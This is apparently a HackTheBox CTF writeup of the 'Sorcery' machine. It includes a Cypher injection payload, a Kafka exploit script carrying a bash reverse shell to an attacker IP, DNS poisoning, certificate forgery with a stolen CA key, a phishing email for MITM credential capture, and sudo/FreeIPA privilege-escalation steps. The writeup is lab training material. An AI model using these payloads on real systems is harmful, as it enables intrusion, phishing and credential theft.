# Sorcery — HackTheBox Writeup
**Difficulty:** Insane | **OS:** Linux

---

## Table of Contents
1. [Enumeration](#enumeration)
2. [Subdomain Discovery](#subdomain-discovery)
3. [Web Application — Neo4j Cypher Injection](#web-application--neo4j-cypher-injection)
4. [WebAuthn Passkey Login](#webauthn-passkey-login)
5. [Remote Code Execution via Kafka](#remote-code-execution-via-kafka)
6. [Internal Network Pivot](#internal-network-pivot)
7. [FTP — Root CA Exfiltration](#ftp--root-ca-exfiltration)
8. [MITM Proxy — Credential Capture (tom_summers)](#mitm-proxy--credential-capture-tom_summers)
9. [Privilege Escalation — tom_summers → tom_summers_admin](#privilege-escalation--tom_summers--tom_summers_admin)
10. [Privilege Escalation — tom_summers_admin → rebecca_smith](#privilege-escalation--tom_summers_admin--rebecca_smith)
11. [Privilege Escalation — rebecca_smith → ash_winter](#privilege-escalation--rebecca_smith--ash_winter)
12. [Privilege Escalation — ash_winter → root (IPA sudo abuse)](#privilege-escalation--ash_winter--root-ipa-sudo-abuse)
13. [Summary](#summary)

---

## Enumeration

Initial Nmap scan reveals two open ports: SSH on 22 and HTTPS on 443.

```bash
nmap -sV -sC 10.129.xx.xx
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 443/tcp | HTTPS | nginx 1.27.1 |

The TLS certificate's `commonName` is `sorcery.htb`. Add it to `/etc/hosts`:

```
10.129.xx.xx    sorcery.htb
```

Navigating to the site redirects to `/auth/login`.

---

## Subdomain Discovery

Fuzz for virtual hosts using `ffuf`, filtering out 301 redirects (the default catch-all):

```bash
ffuf -u https://sorcery.htb/ \
  -H "Host: FUZZ.sorcery.htb" \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fc 301
```

**Result:** `git.sorcery.htb` — a Gitea instance.

Update `/etc/hosts`:

```
10.129.xx.xx    sorcery.htb git.sorcery.htb
```

---

## Web Application — Neo4j Cypher Injection

Registering an account on the main application and exploring the dashboard reveals a store endpoint vulnerable to **Cypher injection** (Neo4j's query language).

The goal is to reset the `admin` user's password. First, generate an Argon2id hash of the desired password:

```bash
echo -n "P@ssw0rd123" | argon2 somesalt -id -t 2 -m 15 -p 1
```

This produces an encoded hash in `$argon2id$...` format.

Inject the following payload (URL-encoded) into the vulnerable store endpoint:

```
"}) WITH result MATCH (u:User {username: 'admin'}) SET u.password =
'<ARGON2ID_HASH>' RETURN result { .*, description: 'admin password updated' } //
```

Append this to:

```
https://sorcery.htb/dashboard/store/<store-uuid>
```

The injection closes the existing query, matches the admin user, and sets their password to the attacker-controlled hash.

<img width="1176" height="940" alt="Screenshot 2026-03-05 152449" src="https://github.com/user-attachments/assets/d9464477-86d5-4ef2-bc33-f094c777419e" />

We login and see we have some more functionalities.

<img width="1174" height="944" alt="Screenshot 2026-03-05 152937" src="https://github.com/user-attachments/assets/ddfcdff8-a23a-4b73-848e-e56bc98e43c7" />

---

## WebAuthn Passkey Login

The admin account is protected by **WebAuthn / Passkey** MFA. The login page offers a "login with passkey" option.

<img width="1289" height="950" alt="Screenshot 2026-03-05 155523" src="https://github.com/user-attachments/assets/8626306d-8d8b-44e1-a759-4ceafc35bdde" />

Using **Chrome** (required for WebAuthn support), navigate to the login page and authenticate as `admin` using the passkey option — this bypasses the password field entirely and uses the browser's built-in authenticator after the password was set via injection.

<img width="1289" height="967" alt="Screenshot 2026-03-05 155433" src="https://github.com/user-attachments/assets/4a64d2bb-7a16-4ce7-ad5d-f5414083c47f" />

<img width="1286" height="937" alt="Screenshot 2026-03-05 155653" src="https://github.com/user-attachments/assets/d83e74d5-4e16-4243-9b4a-aed8394515ed" />

---

## Remote Code Execution via Kafka

After gaining admin access to the application, a **Kafka** message broker is accessible internally at `kafka:9092`. A crafted binary packet is sent to the `update` topic containing a reverse shell payload.

**exploit.py** — builds a raw Kafka `Produce` request:

```python
import struct, zlib, binascii

topic = b"update"
value = b"bash -c 'sh -i >& /dev/tcp/10.10.xx.xx/4444 0>&1'"

def msg(v):
    body = struct.pack(">BBi", 0, 0, -1) + struct.pack(">i", len(v)) + v
    crc = zlib.crc32(body) & 0xFFFFFFFF
    return struct.pack(">I", crc) + body

mset = struct.pack(">q", 0) + struct.pack(">i", len(msg(value))) + msg(value)
pdata = struct.pack(">i", 0) + struct.pack(">i", len(mset)) + mset
tdata = struct.pack(">h", len(topic)) + topic + struct.pack(">i", 1) + pdata
body = struct.pack(">h", 1) + struct.pack(">i", 10000) + struct.pack(">i", 1) + tdata
hdr = struct.pack(">hhih", 0, 0, 42, 3) + b"dbg"
pkt = struct.pack(">i", len(hdr) + len(body)) + hdr + body
print(pkt.hex())
```

Run the script to get the hex payload, then send it raw to `kafka:9092`.

Set up a listener using `penelope`:

```bash
penelope -p 4444
```

<img width="1288" height="942" alt="Screenshot 2026-03-05 161222" src="https://github.com/user-attachments/assets/5ff0c40e-bcac-4adc-ad06-5485b41e84f5" />

A shell arrives as `user` inside a Docker container (`uid=1001(user)`).

---

## Internal Network Pivot

### DNS Manipulation

Inside the container, a `convert.sh` script manages a `dnsmasq` DNS server from flat host files:

```bash
cat /dns/convert.sh
```

Write a custom DNS entry pointing back to your attack machine:

```bash
echo "10.10.xx.xx hello.sorcery.htb" >> /dns/hosts-user
./convert.sh && pkill -9 dnsmasq
```

This allows the internal network to resolve `hello.sorcery.htb` to your IP.

### SOCKS Tunnel via Chisel

Start the Chisel server on your attack machine:

```bash
chisel server -p 8000 --reverse
```

Connect from the container:

```bash
./chisel client 10.10.xx.xx:8000 R:socks
```

This creates a SOCKS5 proxy on `127.0.0.1:1080`, allowing `proxychains` to reach internal hosts.

### Internal Host Discovery

```bash
getent hosts ftp    # → 172.19.0.6
getent hosts mail   # → 172.19.0.8
```

---

## FTP — Root CA Exfiltration

Connect to the internal FTP server anonymously:

```bash
proxychains ftp 172.19.0.6
# Login: anonymous / (blank)
```

The `pub/` directory contains:

- `RootCA.crt` — the internal root certificate
- `RootCA.key` — the private key (passphrase-protected; passphrase is `passphrase`)

Download both files and generate a signed TLS certificate for `hello.sorcery.htb`:

```bash
# Generate key and CSR
openssl genrsa -out hello.sorcery.htb.key 2048
openssl req -new -key hello.sorcery.htb.key -out hello.sorcery.htb.csr \
  -subj "/CN=hello.sorcery.htb"

# Decrypt the Root CA key
openssl rsa -in RootCA.key -out RootCA-unenc.key
# Enter passphrase: passphrase

# Sign the cert
openssl x509 -req -in hello.sorcery.htb.csr \
  -CA RootCA.crt -CAkey RootCA-unenc.key -CAcreateserial \
  -out hello.sorcery.htb.crt -days 365

# Bundle into PEM
cat hello.sorcery.htb.key hello.sorcery.htb.crt > hello.sorcery.htb.pem
```

---

## MITM Proxy — Credential Capture (tom_summers)

Set up `mitmproxy` as a reverse proxy, impersonating `git.sorcery.htb` using the newly-signed certificate. Any browser connecting to `hello.sorcery.htb` (which resolves to your machine via the poisoned DNS) is transparently proxied to `git.sorcery.htb`.

```bash
mitmproxy --mode reverse:https://git.sorcery.htb \
  --certs hello.sorcery.htb.pem \
  --save-stream-file traffic.raw \
  -k -p 443
```

<img width="1290" height="946" alt="Screenshot 2026-03-06 165710" src="https://github.com/user-attachments/assets/762e758e-ebab-4d22-8c09-4e9a377fe45a" />

Send a phishing email to `tom_summers` from a spoofed internal address via the internal mail server as he is regarded employee who gets phished. (MailHog on `172.19.0.8:1025`):

```bash
proxychains -q swaks \
  --to tom_summers@sorcery.htb \
  --from nicole_sullivan@sorcery.htb \
  --server 172.19.0.8 \
  --port 1025 \
  --data "Subject: Hello Tom
Hi Tom,
Please check this link: https://hello.sorcery.htb/user/login"
```

After a short delay, `tom_summers` clicks the link and authenticates through your proxy. The credentials are captured in `traffic.raw`.

**Credentials captured:** `tom_summers` : `<REDACTED>`

---

## SSH as tom_summers

```bash
ssh tom_summers@10.129.xx.xx
```

**User flag:** `REDACTED`

---

## Privilege Escalation — tom_summers → tom_summers_admin

Running `pspy64` reveals a process running as UID 2002 (`tom_summers_admin`):

```
UID=2002  PID=...  | /usr/bin/mousepad /provision/cron/tom_summers_admin/passwords.txt
UID=2002  PID=...  | /usr/bin/Xvfb :1 -fbdir /xorg/xvfb -screen 0 512x256x24 -nolisten local
```

An **Xvfb** (virtual framebuffer) is running and writing its display buffer to `/xorg/xvfb/Xvfb_screen0`. This is a raw XWD image of whatever `tom_summers_admin` has open on the virtual display — which is the `passwords.txt` file in a text editor.

Copy the framebuffer and convert it to a readable PNG:

```bash
cp /xorg/xvfb/Xvfb_screen0 /home/tom_summers/abc
convert xwd:abc screenshot.png
```

<img width="512" height="255" alt="Screenshot 2026-03-06 140728" src="https://github.com/user-attachments/assets/64ecad0c-8b40-4497-8cd1-7fbacc27aaa6" />

The screenshot reveals `tom_summers_admin`'s password.

**Credentials:** `tom_summers_admin` : `<REDACTED>`

```bash
ssh tom_summers_admin@10.129.xx.xx
```

---

## Privilege Escalation — tom_summers_admin → rebecca_smith

`sudo -l` as `tom_summers_admin` reveals:

```
(rebecca_smith) NOPASSWD: /usr/bin/docker login
(rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```

The strategy: launch `docker login` as `rebecca_smith`, then immediately attach `strace` to its PID to intercept the credentials being read from the credential store.

**exploit.sh:**

```bash
#!/bin/bash

# Start docker login in background as rebecca_smith
sudo -u rebecca_smith /usr/bin/docker login &

# Poll for the child PID
TARGET_PID=""
while [ -z "$TARGET_PID" ]; do
    TARGET_PID=$(pgrep -u rebecca_smith -f "/usr/bin/docker login")
done

echo "[+] Target PID: $TARGET_PID"

# Attach strace to intercept credential reads
sudo -u rebecca_smith /usr/bin/strace -s 128 -p $TARGET_PID -f -e trace=openat,read
```

Running this captures a `read()` syscall returning the credential JSON:

```json
{"Username":"rebecca_smith","Secret":"<REDACTED>"}
```

**Credentials:** `rebecca_smith` : `<REDACTED>`

```bash
ssh rebecca_smith@10.129.xx.xx
```

---

## Privilege Escalation — rebecca_smith → ash_winter

Running `pspy64` as `rebecca_smith` reveals an **IPA (FreeIPA)** server running inside Docker and a privileged process modifying a user's password:

```
UID=1638400000  | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=<REDACTED>
```

The credential for `ash_winter` is visible in plaintext from `pspy64` output. However, the password is immediately expired after being set — requiring a password change on first login.

```bash
ssh ash_winter@10.129.xx.xx
# Change password at prompt
```

**Credentials:** `ash_winter` : `<REDACTED>` → changed to new password on login.

---

## Privilege Escalation — ash_winter → root (IPA sudo abuse)

### Initial sudo access

`sudo -l` shows:

```
(root) NOPASSWD: /usr/bin/systemctl restart sssd
```

`ash_winter` has access to the **FreeIPA** CLI. The path to root involves:

1. Adding `ash_winter` to the `sysadmins` IPA group (which has the `manage_sudorules_ldap` role)
2. Adding `ash_winter` to the existing `allow_sudo` sudo rule
3. Reloading `sssd` to apply changes
4. Using the newly-granted `(ALL : ALL) ALL` sudo to become root

### Step 1 — Join the sysadmins group

```bash
ipa group-add-member sysadmins --users=ash_winter
```

### Step 2 — Reload sssd and re-login

```bash
sudo /usr/bin/systemctl restart sssd
# Log out and back in to apply group membership
```

Verify:
```bash
id
# uid=1638400004(ash_winter) gid=1638400004(ash_winter) groups=...,1638400005(sysadmins)
```

### Step 3 — Inspect and modify the sudo rule

```bash
ipa sudorule-find
# Rule: allow_sudo — command category: all, host category: all
```

Add `ash_winter` to the rule:

```bash
ipa sudorule-add-user allow_sudo --users=ash_winter
```

### Step 4 — Reload sssd again

```bash
sudo /usr/bin/systemctl restart sssd
# Log out and back in
```

```bash
sudo -l
# (ALL : ALL) ALL  ← now visible
```

### Step 5 — Root

```bash
sudo su
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:** `REDACTED`

---

## Summary

### Step-by-Step Attack Chain

**1. Reconnaissance**
Run Nmap, discover ports 22 (SSH) and 443 (HTTPS). The TLS cert reveals the hostname `sorcery.htb`. Add to `/etc/hosts`.

**2. Virtual Host Discovery**
Use `ffuf` to brute-force subdomains. Discover `git.sorcery.htb` (a Gitea instance). Add to `/etc/hosts`.

**3. Cypher Injection — Reset Admin Password**
Register a user on the main web app. Find a store endpoint vulnerable to Neo4j Cypher injection. Craft a payload that matches the `admin` user node and overwrites their password hash with an attacker-controlled Argon2id hash. Send the payload URL-encoded to the vulnerable endpoint.

**4. WebAuthn Bypass — Admin Access**
Use Chrome's built-in passkey/WebAuthn authenticator to log in as `admin`, bypassing the password field entirely after overwriting the hash.

**5. Kafka RCE — Shell in Docker Container**
Discover an internal Kafka broker at `kafka:9092`. Craft a raw binary Kafka `Produce` request targeting the `update` topic with a bash reverse shell payload. Send the packet and catch the shell with `penelope`. Land as `user` inside a Docker container.

**6. DNS Poisoning — Redirect Internal Traffic**
Discover a `dnsmasq` DNS server managed by flat host files. Append a custom entry mapping your attack IP to `hello.sorcery.htb`. Run `convert.sh` and restart `dnsmasq` to activate the entry.

**7. SOCKS Tunnel — Internal Network Access**
Deploy `chisel` to create a reverse SOCKS5 tunnel from the container to the attack machine. Use `proxychains` for all subsequent internal connections.

**8. FTP Anonymous Access — Root CA Theft**
Connect to `172.19.0.6` (internal FTP) as `anonymous`. Download `RootCA.crt` and `RootCA.key` from the `pub/` directory. The key passphrase is `passphrase`.

**9. Forge TLS Certificate**
Use the stolen Root CA to sign a new TLS certificate for `hello.sorcery.htb`. This allows the attack machine to impersonate any internal HTTPS service trusted by the internal CA.

**10. MITM + Phishing Email — Capture tom_summers**
Run `mitmproxy` in reverse-proxy mode, forwarding `hello.sorcery.htb` traffic to `git.sorcery.htb`. Send a phishing email to `tom_summers` via the internal MailHog SMTP server (172.19.0.8:1025), spoofed from a colleague. The victim authenticates through the proxy; credentials are captured in the stream file.

**11. User Flag**
SSH as `tom_summers` and read `user.txt`.

**12. Xvfb Framebuffer Scraping — tom_summers_admin Password**
`pspy64` reveals that `tom_summers_admin` is running a virtual framebuffer display (`Xvfb`) with a text editor open on a `passwords.txt` file. Copy the raw XWD framebuffer file and convert it to a PNG with ImageMagick. The password is visible in the screenshot.

**13. docker login + strace — rebecca_smith Password**
`sudo -l` allows running `docker login` and `strace` as `rebecca_smith`. Race the PID of `docker login` and attach `strace` to intercept `read()` syscalls on the credential store file. The JSON credential blob containing `rebecca_smith`'s Docker Hub password is captured in plaintext.

**14. pspy64 IPA Command Snooping — ash_winter Password**
As `rebecca_smith`, run `pspy64` and monitor IPA-related commands. A privileged automation process runs `ipa user-mod ash_winter --setattr userPassword=...`, exposing the password in the process list. SSH as `ash_winter` and change the expired password at the prompt.

**15. FreeIPA Sudo Rule Abuse — Root**
`ash_winter` has IPA CLI access and can run `systemctl restart sssd` as root. The chain:
- Add `ash_winter` to the `sysadmins` IPA group (grants `manage_sudorules_ldap` role)
- Restart `sssd` and re-login to apply group membership
- Use `ipa sudorule-add-user` to add `ash_winter` to the `allow_sudo` rule (all commands, all hosts)
- Restart `sssd` again and re-login
- `sudo su` to root

---

### Credentials Summary (Redacted)

| User | Method |
|------|--------|
| `admin` | Cypher injection → hash overwrite |
| `tom_summers` | MITM proxy on phishing link |
| `tom_summers_admin` | Xvfb framebuffer screenshot |
| `rebecca_smith` | `strace` on `docker login` |
| `ash_winter` | `pspy64` watching IPA `user-mod` command |
| `root` | IPA sudo rule self-modification + `sssd` restart |

---

### Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning |
| `ffuf` | Subdomain fuzzing |
| `argon2` | Password hash generation |
| `penelope` | Reverse shell handler |
| `chisel` | SOCKS5 reverse tunnel |
| `proxychains` | Internal network routing |
| `swaks` | SMTP email sending |
| `mitmproxy` | TLS MITM / reverse proxy |
| `openssl` | Certificate generation and signing |
| `pspy64` | Process monitoring |
| `strace` | Syscall tracing |
| `ImageMagick (convert)` | XWD framebuffer → PNG |
| `ipa` | FreeIPA CLI for group/sudo manipulation |
